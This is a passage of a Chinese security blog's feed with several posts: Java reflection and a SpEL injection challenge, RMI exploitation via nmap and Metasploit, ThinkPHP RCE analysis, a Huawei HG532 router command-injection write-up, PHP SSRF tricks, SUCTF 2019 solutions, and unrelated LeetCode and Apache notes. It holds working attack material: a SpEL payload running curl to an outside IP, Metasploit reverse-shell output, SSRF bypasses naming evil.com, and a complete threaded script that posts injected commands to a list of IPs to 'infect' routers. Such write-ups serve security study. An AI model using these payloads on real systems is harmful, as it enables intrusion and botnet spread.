    <content type="text"><![CDATA[是时候开始研究java代码审计了 反射 通过反射可以使得java语言具有动态特性 通过java.lang.Runtime 反射利用的代码如下： 1234public static void main(String[] args) throws ClassNotFoundException,NoSuchMethodException, IllegalAccessException, InvocationTargetException &#123; Class clazz = Class.forName("java.lang.Runtime"); clazz.getMethod("exec", String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz), "calc.exe");&#125; java.lang.Runtime遵循单例模式，也就是说构造方法是私有的、 查看其源码可以发现: 12/** Don't let anyone else instantiate this class */private Runtime() &#123;&#125; 注释中特意写明了不要让任何人实例化这个类 12345678910111213private static Runtime currentRuntime = new Runtime();/** * Returns the runtime object associated with the current Java application. * Most of the methods of class &lt;code&gt;Runtime&lt;/code&gt; are instance * methods and must be invoked with respect to the current runtime object. * * @return the &lt;code&gt;Runtime&lt;/code&gt; object associated with the current * Java application. */public static Runtime getRuntime() &#123; return currentRuntime;&#125; 遵循单例模式所以就会有一个静态方法getRuntime 要实现反射执行exec，前面提到的payload可以分为几个部分 12345//获取到java.lang.Runtime的class对象Class clazz = Class.forName("java.lang.Runtime");Method execMethod = clazz.getMethod("exec", String.class);Method runtimeMethod = clazz.getMethod("getRuntime");execMethod.invoke(runtimeMethod.invoke(clazz), "calc.exe"); 注意每一个反射得来的方法invoke的时候第一个参数必须是对象 ProcessBuilder的利用 1234//顾名思义和StringBuilder又几分相似Class clazz = Class.forName("java.lang.ProcessBuilder");Method startMethod = clazz.getMethod("start");startMethod.invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList("calc.exe"))); 同样我们通过反射拿到start方法，然后调用的时候，由于第一个参数必须是该类的对象，所以我们通过getConstructor方法拿到它的构造方法之后实例化 反射例题 引用code breaking的一道题目 题目是一个登陆的页面，用户名和密码都是admin，登陆的时候可以勾选remeber-me选项 登录之后是一个hello页面 1234567891011121314151617@GetMappingpublic String admin(@CookieValue(value = "remember-me", required = false) String rememberMeValue,HttpSession session,Model model) &#123; if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals("")) &#123; String username = userConfig.decryptRememberMe(rememberMeValue); if (username != null) &#123; session.setAttribute("username", username); &#125; &#125; Object username = session.getAttribute("username"); if(username == null || username.toString().equals("")) &#123; return "redirect:/login"; &#125; model.addAttribute("name", getAdvanceValue(username.toString())); return "hello"; &#125; 勾选了remember-me之后，会从中解密得到username，然后将其传递给一个方法getAdvanceValue跟进这个方法： 12345678910111213private String getAdvanceValue(String val) &#123; for (String keyword: keyworkProperties.getBlacklist()) &#123; Matcher matcher = Pattern.compile(keyword, Pattern.DOTALL | Pattern.CASE_INSENSITIVE).matcher(val); if (matcher.find()) &#123; throw new HttpClientErrorException(HttpStatus.FORBIDDEN); &#125; &#125; ParserContext parserContext = new TemplateParserContext(); Expression exp = parser.parseExpression(val, parserContext); SmallEvaluationContext evaluationContext = new SmallEvaluationContext(); return exp.getValue(evaluationContext).toString(); &#125; 可以看到有一个黑名单，之后的几行代码是解析一个表达式并执行的 构造利用链: 1String.class.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",String.class).invoke(String.class.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(String.class.getClass().forName("java.l"+"ang.Ru"+"ntime")),"curl 39.106.125.244:8888" 就用它的那个类进行加密： 12 得到payload 1VEdGePvYTXhp0TFlUTtEl9RimJGOGpGZmgTM181ZSAKn4ScdI0Z7KYgJhlMaf9ccTQkfOt9mgarInh090nWzls6IIWfW48Zkp8HC-rIyg6JtO-AMtI9O1NJYoSTFhcKdJqkg7VdFU-VG3b6vZrkJtwrj_i6Lv2-MBChAj5zXjZb7KGe6wnDO9NuYCGxQPgeADgBBME92fOaL3pOQp4Bte6O3gv0O3m6y09PwZ3jc-PMHalwzRzgR-M1svkqJushiOMCAj1i9rDZK3uOk1_CdFzQKq1to-MOwohuebk7d9NZRM_jWyG2fyJrqxJ6JPlquC7whDaz8Bz8gxXc2QYn2rrjhRZ0w5sn1IaRmg2DoPiel0OUd9LKMhxWDoLHZHu7X 利用效果： VPS监听到了请求 RMI 一个探测的工具 用nmap扫描可以发现这次的主角Java RMI Registry 接下来可以使用nmap的脚本进行验证 123456789101112131415161718$ nmap --script=rmi-vuln-classloader -p 1099 192.168.182.134Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-05 06:41 EDTNmap scan report for 192.168.182.134Host is up (0.00041s latency).PORT STATE SERVICE1099/tcp open rmiregistry| rmi-vuln-classloader: | VULNERABLE:| RMI registry default configuration remote code execution vulnerability| State: VULNERABLE| Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.| | References:|_ https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rbMAC Address: 00:0C:29:D9:A2:EA (VMware)Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds 主机是有漏洞的 msf上搜索java_rmi的模块 1234567891011msf5 &gt; search java_rmiMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/gather/java_rmi_registry normal No Java RMI Registry Interfaces Enumeration 1 auxiliary/scanner/misc/java_rmi_server 2011-10-15 normal Yes Java RMI Server Insecure Endpoint Code Execution Scanner 2 exploit/multi/browser/java_rmi_connection_impl 2010-03-31 excellent No Java RMIConnectionImpl Deserialization Privilege Escalation 3 exploit/multi/misc/java_rmi_server 2011-10-15 excellent No Java RMI Server Insecure Default Configuration Java Code Execution 检测到 12345msf5 auxiliary(scanner/misc/java_rmi_server) &gt; exploit [+] 192.168.182.134:1099 - 192.168.182.134:1099 Java RMI Endpoint Detected: Class Loader Enabled[*] 192.168.182.134:1099 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed Class Loader Enabled 使用java_rmi_server进行攻击，但是并没有成功 1234567891011121314msf5 exploit(multi/misc/java_rmi_server) &gt; exploit [*] Started reverse TCP handler on 192.168.182.133:4444 [*] 192.168.182.134:1099 - Using URL: http://0.0.0.0:8080/3KFzyXCBVe[*] 192.168.182.134:1099 - Local IP: http://192.168.182.133:8080/3KFzyXCBVe[*] 192.168.182.134:1099 - Server started.[*] 192.168.182.134:1099 - Sending RMI Header...[*] 192.168.182.134:1099 - Sending RMI Call...[*] 192.168.182.134:1099 - Replied to request for payload JAR[*] Sending stage (53845 bytes) to 192.168.182.134[*] Meterpreter session 3 opened (192.168.182.133:4444 -&gt; 192.168.182.134:35718) at 2019-10-05 06:47:47 -0400[-] 192.168.182.134:1099 - Exploit failed: RuntimeError Timeout HTTPDELAY expired and the HTTP Server didn&apos;t get a payload request[*] 192.168.182.134:1099 - Server stopped.[*] Exploit completed, but no session was created. 参考 Java RMI漏洞利用]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ctf入门第一课]]></title>
    <url>%2F2019%2F09%2F26%2Fctf%E5%85%A5%E9%97%A8%E7%AC%AC%E4%B8%80%E8%AF%BE%2F</url>
    <content type="text"><![CDATA[ctf入坑 ctfwiki是一个很好的入门资源 适合新手的CTF靶场合集 最经典的靶场bugkuctf 如何学习 学会做笔记——使用markdown快速整理你的思路 论博客的重要性——Github pages or Wordpress or 各大博客平台(简书，csdn，博客园，掘金等等) 学会分享——分享自己所学到的知识 学会使用python 如何提问 提问的艺术 Web安全 Web安全主要包含——SQL注入，XSS跨站，SSRF，各种web框架的审计等 SQL注入 sqlmap SQL教程 前端与后台是如何交互的 输入1返回的值 后台的代码： 12345678&lt;?phpif( isset( $_REQUEST[ 'Submit' ] ) ) &#123; // Get input $id = $_REQUEST[ 'id' ]; // Check database $query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';"; $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' );?&gt; 重点关注： &quot;SELECT first_name, last_name FROM users WHERE user_id = '$id';&quot; where语句的用法 详情参考DVWA学习 栗子sql注入实践 墨者的一道题目 看到新闻页面 直接上sqlmap 爆表 指定数据库爆表 指定表爆字段 将表全部dump出来 突然出问题了。。 XSS跨站 参考ctfwiki 具体细节之后说]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>学习</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thinkphp-rce分析]]></title>
    <url>%2F2019%2F09%2F24%2Fthinkphp-rce%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[太惭愧了，今年一月份大火的thinkphp漏洞根本没关注，现在回过头来仔细分析下 开启debug模式 先放截图： 然后开始一步步来搞 php-storm如何调试就不细说了 thinkphp从这里开始启动，有机会一定要分析下thinkphp是如何运行的 这里F8一下先进入了一个autoload函数，具体作用不是很清楚 进入run函数之后，会先实例化一个$request 之后进行一些模块绑定的操作，之后进入self::routerCheck函数，进行URL路由检测 而self::routerCheck函数又会调用Route::check函数 Route::check函数中： 12345678910111213141516$url = str_replace($depr, '|', $url);if (strpos($url, '|') &amp;&amp; isset(self::$rules['alias'][strstr($url, '|', true)])) &#123; // 检测路由别名 $result = self::checkRouteAlias($request, $url, $depr); if (false !== $result) &#123; return $result; &#125;&#125;$method = strtolower($request-&gt;method());// 获取当前请求类型的路由规则$rules = self::$rules[$method];// 检测域名部署if ($checkDomain) &#123; self::checkDomain($request, $rules, $method);&#125; 这里最关键的就是$method = strtolower($request-&gt;method()); 转过头来分析这个函数 1234567891011121314151617181920212223 /** * 当前的请求类型 * @access public * @param bool $method true 获取原始请求类型 * @return string */ public function method($method = false) &#123; if (true === $method) &#123; // 获取原始请求类型 return IS_CLI ? 'GET' : (isset($this-&gt;server['REQUEST_METHOD']) ? $this-&gt;server['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']); &#125; elseif (!$this-&gt;method) &#123; if (isset($_POST[Config::get('var_method')])) &#123; $this-&gt;method = strtoupper($_POST[Config::get('var_method')]); $this-&gt;&#123;$this-&gt;method&#125;($_POST); &#125; elseif (isset($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'])) &#123; $this-&gt;method = strtoupper($_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE']); &#125; else &#123; $this-&gt;method = IS_CLI ? 'GET' : (isset($this-&gt;server['REQUEST_METHOD']) ? $this-&gt;server['REQUEST_METHOD'] : $_SERVER['REQUEST_METHOD']); &#125; &#125; return $this-&gt;method; &#125; 此时我们看到调用了__construct方法 123456789101112131415161718/** * 架构函数 * @access protected * @param array $options 参数 */protected function __construct($options = [])&#123; foreach ($options as $name =&gt; $item) &#123; if (property_exists($this, $name)) &#123; $this-&gt;$name = $item; &#125; &#125; if (is_null($this-&gt;filter)) &#123; $this-&gt;filter = Config::get('default_filter'); &#125; // 保存 php://input $this-&gt;input = file_get_contents('php://input');&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[华为路由器 H532G 漏洞分析]]></title>
    <url>%2F2019%2F09%2F20%2F%E5%8D%8E%E4%B8%BA%E8%B7%AF%E7%94%B1%E5%99%A8-H532G-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[漏洞分析 这次出问题的点是upnp程序 123home/oit/Downloads/_router HG532e.rar-0.extracted/_HG532eV100R001C01B020_upgrade_packet.bin.extracted/squashfs-root/bin [oit@ubuntu] [18:36]&gt; file upnp upnp: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked (uses shared libs), corrupted section header size 是MIPS32位大端格式 UPnP 是由“通用即插即用论坛”（UPnP™ Forum）推广的一套网络协议。该协议的目标是使家庭网络（数据共享、通信和娱乐）和公司网络中的各种设备能够相互无缝连接，并简化相关网络的实现。 丢到IDA中分析 1234567891011121314151617181920212223242526272829303132LOAD:004074FC la $a1, aNewstatusurl # &quot;NewStatusURL&quot;LOAD:00407500 move $a2, $zeroLOAD:00407504 jalr $t9 ; ATP_XML_GetChildNodeByNameLOAD:00407508 addiu $a3, $sp, 0x24LOAD:0040750C lw $gp, 0x18($sp)LOAD:00407510 bnez $v0, loc_407564LOAD:00407514 move $s1, $v0LOAD:00407518 lw $v0, 0x24($sp)LOAD:0040751C nopLOAD:00407520 beqz $v0, loc_407564LOAD:00407524 addiu $s0, $sp, 0x28LOAD:00407528 la $t9, snprintfLOAD:0040752C lw $a3, 0x20($sp)LOAD:00407530 la $a2, aUpgGUST1Firmwa # &quot;upg -g -U %s -t &apos;1 Firmware Upgrade Ima&quot;...LOAD:00407538 move $a0, $s0LOAD:0040753C li $a1, 0x400LOAD:00407540 jalr $t9 ; snprintfLOAD:00407544 sw $v0, 0x10($sp)LOAD:00407548 lw $gp, 0x18($sp)LOAD:0040754C nopOAD:00407520 beqz $v0, loc_407564LOAD:00407524 addiu $s0, $sp, 0x28LOAD:00407528 la $t9, snprintfLOAD:0040752C lw $a3, 0x20($sp)LOAD:00407530 la $a2, aUpgGUST1Firmwa # &quot;upg -g -U %s -t &apos;1 Firmware Upgrade Ima&quot;...LOAD:00407538 move $a0, $s0LOAD:0040753C li $a1, 0x400LOAD:00407540 jalr $t9 ; snprintfLOAD:00407544 sw $v0, 0x10($sp)LOAD:00407548 lw $gp, 0x18($sp)LOAD:0040754C nopLOAD:00407550 la $t9, system #执行system 分析upnp描述信息后 发现该设备支持名为DeviceUpgrade的一种服务类型 设备可以通过这种服务更新固件 具体过程是向“/ctrlt/DeviceUpgrade_1”这个地址提交请求 请求中包含NewStatusURL及NewDownloadURL两个元素。 远程管理员可以通过该漏洞在设备上执行任意命令 将shell元字符 注入NewStatusURL以及NewDownloadURL元素中 先调用了一个xml相关的函数，获取参数的值，很明显的看到了参数拼接的行为，之后调用了system函数 123snprintf($s0, 0x400, &apos;upg -g -U %s -t &apos;1 Firmware Upgrade Image&apos; -c upnp -r %s -d -&apos;, NewDownloadURL, NewStatusURL)system($s0) 不过还有一个认证机制需要 Authorization 头 才能过掉 check, 否则会 401 实际测试 路由器下载地址 尝试直接运行脚本失败了 1234567891011121314151617181920212223242526root@ml-vm:/home/oit/tools/fat# ./sources/extractor/extractor.py -b iot -sql 127.0.0.1 -np -nk &quot;./HG532e.rar&quot; images-----------------Extractor Start----------------input:./HG532e.raroutput:imagesrootfs:Truekernel:Falseparallel:Falsesql:127.0.0.1brand:iot-----------------Extractor End------------------&gt;&gt; Database Image ID: 146/home/oit/tools/fat/HG532e.rar&gt;&gt; MD5: 9986b8aee8e1eb511a8bbb3a39b485e4&gt;&gt; Tag: 146&gt;&gt; Temp: /tmp/tmpLXreHs&gt;&gt; Status: Kernel: True, Rootfs: False, Do_Kernel: False, Do_Rootfs: True&gt;&gt;&gt;&gt; RAR archive data, first volume type: MAIN_HEAD&gt;&gt; Recursing into archive ...Traceback (most recent call last): File &quot;./sources/extractor/extractor.py&quot;, line 425, in extract File &quot;./sources/extractor/extractor.py&quot;, line 472, in _check_archive File &quot;./sources/extractor/extractor.py&quot;, line 693, in _check_recursive File &quot;./sources/extractor/extractor.py&quot;, line 381, in extractUnicodeDecodeError: &apos;ascii&apos; codec can&apos;t decode byte 0xd8 in position 37: ordinal not in range(128)&gt;&gt; Cleaning up /tmp/tmpLXreHs... 打算用qemu运行一个虚拟机来搞 123456789101112131415161718root@ml-vm:/mnt/hgfs/IOTEXP/_router HG532e.rar.extracted/_HG532eV100R001C01B020_upgrade_packet.bin.extracted# sudo qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -nographic -net nic -net tap,ifname=br0,script=no,downscript=no[ 0.000000] Initializing cgroup subsys cpuset[ 0.000000] Initializing cgroup subsys cpu[ 0.000000] Linux version 2.6.32-5-4kc-malta (Debian 2.6.32-48squeeze4) (dannf@debian.org) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 Tue Sep 24 00:02:22 UTC 2013[ 0.000000] [ 0.000000] LINUX started...[ 0.000000] bootconsole [early0] enabled[ 0.000000] CPU revision is: 00019300 (MIPS 24Kc)[ 0.000000] FPU revision is: 00739300[ 0.000000] Determined physical RAM map:[ 0.000000] memory: 00001000 @ 00000000 (reserved)...[ 0.000000] SLUB: Genslabs=7, HWalign=64, Order=0-3, MinObjects=0, CPUs=1, Nodes=1[ 0.000000] Hierarchical RCU implementation.[ 0.000000] NR_IRQS:256[ 0.000000] CPU frequency 200.00 MHz[ 0.000000] Console: colour dummy device 80x25[ 0.000000] console [tty0] enabled, bootconsole disabled 但是一直没有打开shell ebian mips qemu镜像 换了一个磁盘和内核，成功地开启了虚拟机但是网络配置没有成功 未完待续。。 修改了一下/etc/network/interfaces成功了 1scp -r ./squashfs-root root@192.168.104.187:/root 文件拷贝进去 进入虚拟机之后开启服务 exp 1234567891011121314151617181920212223import threading, sys, time, random, socket, re, os, struct, array, requestsfrom requests.auth import HTTPDigestAuthips = open(sys.argv[1], "r").readlines()cmd = "" # Your MIPS (SSHD)rm = "&lt;?xml version=\"1.0\" ?&gt;\n &lt;s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"&gt;\n &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"&gt;\n &lt;NewStatusURL&gt;$(" + cmd + ")&lt;/NewStatusURL&gt;\n&lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt;\n&lt;/u:Upgrade&gt;\n &lt;/s:Body&gt;\n &lt;/s:Envelope&gt;"class exploit(threading.Thread): def __init__ (self, ip): threading.Thread.__init__(self) self.ip = str(ip).rstrip('\n') def run(self): try: url = "http://" + self.ip + ":37215/ctrlt/DeviceUpgrade_1" requests.post(url, timeout=5, auth=HTTPDigestAuth('dslf-config', 'admin'), data=rm) print "[SOAP] Attempting to infect " + self.ip except Exception as e: passfor ip in ips: try: n = exploit(ip) n.start() time.sleep(0.03) except: pass 确实成功了 但是没有虚拟机上没有这个命令emmm 参考 Huawei HG532 系列路由器远程命令执行漏洞分析 CVE-2017-17215路由器漏洞分析]]></content>
  </entry>
  <entry>
    <title><![CDATA[PHP SSRF Techniques]]></title>
    <url>%2F2019%2F08%2F21%2FPHP-SSRF-Techniques-%E7%BF%BB%E8%AF%91%2F</url>
    <content type="text"><![CDATA[写前面 这篇文章讲的实在是太棒了 https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51 php版本： 测试代码： 12345678910111213141516171819&lt;?php echo "Argument: ".$argv[1]."\n"; // check if argument is a valid URL if(filter_var($argv[1], FILTER_VALIDATE_URL)) &#123; // parse URL $r = parse_url($argv[1]); print_r($r); // check if host ends with google.com if(preg_match('/google\.com$/', $r['host'])) &#123; // get page from URL exec('curl -v -s "'.$r['host'].'"', $a); print_r($a); &#125; else &#123; echo "Error: Host not allowed"; &#125; &#125; else &#123; echo "Error: Invalid URL"; &#125;?&gt; 首先调用了filter_var进行URL的验证，然后再用parse_url去解析URL，php7的版本中这个函数是没有问题的 同时通过preg_match函数限定只能以google.com结尾 如果达到ssrf呢？ 正常情况下 攻击者： 此时$r['host']显然不是以google.com结尾的 绕过URL验证和正则表达式 许多URL schema保留某些特殊含义的字符：它们在URL的特定于方案的部分中的外观具有指定的语义。如果在方案中保留对应于八位字节的字符，则必须对八位字节进行编码。字符“;”，“/”，“？”，“：”，“@”，“=”和“＆”可以保留用于方案内的特殊含义。在方案中不能保留其他字符。 通常会用一些保留字符，比如;和=，,分割参数和参数值 一个可能是用name;v=1.1来表示name=version 1.1,然而也可以用name,1.1达到相同的效果，这根据算法来区分 curl或者wget会认为evil.com;google.com中hostname为evil.com,querystring为google.com 但是并没有绕过filter_var函数 filter_var()函数可以解析很多不同的URL scheme 如果改成这样： 此时已经成功地绕过了URL验证和正则表达式 但是curl命令却没有执行，于是考虑加上端口号 再次修改： php test.php &quot;111://evil.com:80;google.com:80/&quot; 同样用逗号也行 parse_url只会尽可能地分割URL，而不是验证它，作者还提到了一种更好的方式： 0://evil$google.com 注意这里必须用单引号括起来。。 实现XSS 作者之后修改了代码： 12345678910111213141516171819&lt;?php echo "Argument: ".$argv[1]."\n"; // check if argument is a valid URL if(filter_var($argv[1], FILTER_VALIDATE_URL)) &#123; // parse URL $r = parse_url($argv[1]); print_r($r); // check if host ends with google.com if(preg_match('/google\.com$/', $r['host'])) &#123; // get page from URL $a = file_get_contents($argv[1]); echo($a); &#125; else &#123; echo "Error: Host not allowed"; &#125; &#125; else &#123; echo "Error: Invalid URL"; &#125;?&gt; 作者想要注入一点东西,但是并没有成功 继续尝试： data://google.com/plain;base64,SSBsb3ZlIFBIUAo= 那么XSS就很容易了 参考 PHP SSRF Techniques Some trick in ssrf and unserialize()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[threeSumClosest]]></title>
    <url>%2F2019%2F08%2F20%2FthreeSumClosest%2F</url>
    <content type="text"><![CDATA[好久没写leetcode了，最近决定用php来写一些 threesumcloset这题要求在一个数组中找到离target最近的三个数的和 这里用到了一下双指针的思路，就是确定两个指针，一个往高走，一个往低走 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?phpclass threeSumClosest&#123; /** * @param Integer[] $nums * @param Integer $target * @return Integer */ function threeSumClosest($nums, $target) &#123; //先排序，php数组排序的函数 sort($nums); //计算长度 $len = count($nums); /* * 基本思路：通过i遍历数组，再设置两个指针 */ $minidistance = PHP_INT_MAX; //保存最小的距离 $low = 1; $high = $len-1; for($i = 0; $i &lt; $len-2; $i++)&#123; //要去重 if ($i &gt; 0 &amp;&amp; $nums[$i] == $nums[$i-1])&#123; continue; &#125; //得到两个指针 $sum = $nums[$low]+$nums[$high]+$nums[$i]; $distance = $target-$sum; if($distance == 0)&#123; return $distance; &#125; if($distance !== 0&amp;&amp; abs($distance) &lt; abs($minidistance))&#123; $minidistance = $sum; &#125; //然后开始移动指针 if($distance &lt; 0)&#123; //小于0是不是可以把low调大一点，注意去重 if($low &lt; $high &amp;&amp; $nums[$low] != $nums[$low-1])&#123; $low = $low + 1; &#125; &#125; elseif ($distance &gt; 0)&#123; if($low &lt; $high &amp;&amp; $nums[$high] != $nums[$high+1])&#123; $high = $high - 1; &#125; &#125; &#125; return $minidistance; &#125;&#125;$a = new threeSumClosest();$nums = [-1,2,-1,4];$target = 1;echo $a-&gt;threeSumClosest($nums, $target); 新手php代码写的还很烂，提交之后没有过 遇到了几个地方记录一下 php的注释形式，需要写清楚参数的类型和返回值 php中最大的整数是PHP_INT_MAX if ($i &gt; 0 &amp;&amp; $nums[$i] == $nums[$i-1]){由于没有加上$i&gt;0，php可以倒过来取数字而不报错的 12[0,0,0]1 这个测试过不了 去重的方式了解一下 php数组排序 这里用sort就好，之前用asort的时候索引没有变。这种排序也是很强了 最后的这个报错很玄学了 更新一下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phpclass threeSumClosest&#123; /** * @param Integer[] $nums * @param Integer $target * @return Integer */ function threeSumClosest1($nums, $target) &#123; //先排序，php数组排序的函数 sort($nums); //计算长度 $len = count($nums); /* * 基本思路：通过i遍历数组，再设置两个指针 */ $minidistance = PHP_INT_MAX; //保存最小的距离 $low = 1; $high = $len-1; for($i = 0; $i &lt; $len-2; $i++)&#123; //要去重 //得到两个指针 $low = $i+1; $high = $len-1; while($low &lt; $high)&#123; $sum = $nums[$i]+$nums[$low]+$nums[$high]; $distance = $target-$sum; if($distance === 0)&#123;return $distance;&#125; if(abs($distance) &lt; abs($minidistance))&#123;$minidistance = $distance;&#125; if($distance &gt; 0)&#123;$low=$low+1;&#125; if($distance &lt; 0)&#123;$high=$high-1;&#125; &#125; &#125; return $target - $minidistance; &#125;&#125;$a = new threeSumClosest();$nums = [-1,0,1,1,55];$target = 3;echo $a-&gt;threeSumClosest1($nums, $target); success 参考 算法总结--数组相关 双指针法的常见应用。 大师傅的代码]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>array</tag>
        <tag>search</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[学习apache]]></title>
    <url>%2F2019%2F08%2F20%2F%E5%AD%A6%E4%B9%A0apache%2F</url>
    <content type="text"><![CDATA[一直以来习惯了在Windows下通过wampserver和phpstudy来进行php,apache,mysql的组合，现在有必要自己从头开始进行一些学习了 apache配置学习 .htaccess文件 先看一段防盗链的代码： 1234567RewriteBase /RewriteCond %&#123;HTTP_REFERER&#125; !^$RewriteCond %&#123;HTTP_REFERER&#125; !^http://(www.)?aqee.net/.*$ [NC]RewriteRule .(gif|jpg|swf|flv|png)$ /feed/ [R=302,L] 肯定是一脸茫然 那就好好学习一下.htaccess文件 服务器状态码 在服务器回应客户端时会回应相应的状态码，不同的状态码具有不同的含义 1xx：信息类 2xx：成功类 3xx：重定向类 4xx：客户端错误类 5xx：服务端错误类 （比如我用flask写一个小型的应用时，遇到了500的错误其实是代码出错了😢 参考 由浅入深学习apache]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>apache</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[suctf2019]]></title>
    <url>%2F2019%2F08%2F20%2Fsuctf2019%2F</url>
    <content type="text"><![CDATA[easy_sql 应该是非预期解，输入abs(1)就有flag 不过也可以这样 后期在线维护的时候泄露了源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?php session_start(); include_once "config.php"; $post = array(); $get = array(); global $MysqlLink; //GetPara(); $MysqlLink = mysqli_connect("localhost",$datauser,$datapass); if(!$MysqlLink)&#123; die("Mysql Connect Error!"); &#125; $selectDB = mysqli_select_db($MysqlLink,$dataName); if(!$selectDB)&#123; die("Choose Database Error!"); &#125; foreach ($_POST as $k=&gt;$v)&#123; if(!empty($v)&amp;&amp;is_string($v))&#123; $post[$k] = trim(addslashes($v)); &#125; &#125; foreach ($_GET as $k=&gt;$v)&#123; &#125; &#125; //die(); ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/a&gt;&lt;form action="" method="post"&gt;&lt;input type="text" name="query"&gt;&lt;input type="submit"&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php if(isset($post['query']))&#123; $BlackList = "prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\""; //var_dump(preg_match("/&#123;$BlackList&#125;/is",$post['query'])); if(preg_match("/&#123;$BlackList&#125;/is",$post['query']))&#123; //echo $post['query']; die("Nonono."); &#125; if(strlen($post['query'])&gt;40)&#123; die("Too long."); &#125; $sql = "select ".$post['query']."||flag from Flag"; mysqli_multi_query($MysqlLink,$sql); do&#123; if($res = mysqli_store_result($MysqlLink))&#123; while($row = mysqli_fetch_row($res))&#123; print_r($row); &#125; &#125; &#125;while(@mysqli_next_result($MysqlLink)); &#125; ?&gt; 看源码不太明白这个题目的用意，后来参考师傅们的wp时提到了||拼接 mysql 修改sql_mode 实现字符串管道‘||’连接 一种思路是直接使用*,1去拿到flag，另一种方式就是设置sql_mode来实现字符串的拼接 python nginx 首页有源码 123456789101112131415161718192021222324 @app.route('/getUrl', methods=['GET', 'POST'])def getUrl(): url = request.args.get("url") host = parse.urlparse(url).hostname if host == 'suctf.cc': return "我扌 your problem? 111" parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return "我扌 your problem? 222 " + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl).read() else: return "我扌 your problem? 333" &lt;/code&gt; &lt;!-- Dont worry about the suctf.cc. Go on! --&gt; &lt;!-- Do you know the nginx? --&gt; 这个题目似乎有一个姿势 urlparse函数 1234567891011zz :: ~ » pythonPython 3.5.4 (v3.5.4:3f56838, Aug 8 2017, 02:17:05) [MSC v.1900 64 bit (AMD64)] on win32Type "help", "copyright", "credits" or "license" for more information.&gt;&gt;&gt; from urllib.parse import urlparse&gt;&gt;&gt; r = "https://prontosil.club"&gt;&gt;&gt; urlparse_result = urlparse(r)&gt;&gt;&gt; urlparse_resultParseResult(scheme='https', netloc='prontosil.club', path='', params='', query='', fragment='')&gt;&gt;&gt; urlparse_result.hostname'prontosil.club'&gt;&gt;&gt; checkin 自己在nginx环境下进行了测试，成功地用了.user.ini复现了这个(开始的时候总是失败也是很迷了，似乎不能在index.php下进行测试) 上传一个.user.ini 然后上传一个马 然后直接访问就行了 orz服了 参考 SUCTF 2019 web partial wp]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>suctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[scrapy爬虫入门]]></title>
    <url>%2F2019%2F08%2F19%2Fscrapy%E7%88%AC%E8%99%AB%E5%85%A5%E9%97%A8%2F</url>
